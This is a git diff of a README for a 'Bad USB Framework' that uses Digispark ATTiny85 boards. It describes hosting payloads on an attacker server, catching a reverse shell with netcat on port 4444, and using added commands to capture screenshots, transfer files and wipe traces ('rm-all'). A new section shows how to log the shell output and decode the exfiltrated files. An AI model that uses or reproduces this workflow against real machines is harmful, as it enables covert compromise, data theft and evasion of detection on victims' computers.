@@ -1,4 +1,4 @@
-# ATTiny85 Digispark Scripts
+# Bad USB Framework
 
 ## DISCLAIMER
 
@@ -45,11 +45,7 @@ Within the files, you will find either `[FILE_SERVER]` or `[IP_ADDRESS]`.
 
 In `payloads.ps1`, just change it to the VPS's IP address. In `The-Go-To.ino`, change it to `http://<IP_ADDRESS>`.
 
-### Your Attacker VPS
-
-Setup a `Digital Ocean VPS Droplet` with Ubuntu LTS and perform a full upgrade.
-
-Clone this repository into the droplet and go into the directory.
+### Setting Up Payload File Server
 
 Within the `payloads/` directory, host a simple HTTP server using Python3 using:
 
@@ -80,13 +76,29 @@ nc -lnvp 4444
 
 ![Reverse Shell](./README_img/netcat.png)
 
-### Exploitation
+### Exploitations
 
 From here you can perform tasks just as any other reverse shell. There are some additional commands as well:
 
 1. `screenshot` (Returns a Base64 encoding of their screenshot. Pipe the output into a file and use `./exfiltrated_data/reverse_shell/Base62_Decoder.sh` to decode the files.)
 2. `transfer` (Similar to `screenshot` but transfers files. Must use absolute path.)
 3. `rm-all` (Removes connection and deletes all files. Leaving no trace.)
+
+### Recommendations
+
+Change to the `./exfiltrated_data/reverse_shell/` directory and run `netcat` here. Be sure to pipe the outputs into a file.
+
+```bash
+nc -lnvp 4444 | tee output
+```
+
+Once done, you can decode all the exfiltrated files and screeenshots using the following command:
+
+```bash
+bash ./Base62_Decoder.sh ./output
+```
+
+It will then decode all the files that you've extracted.
 
 ## Moving On
 
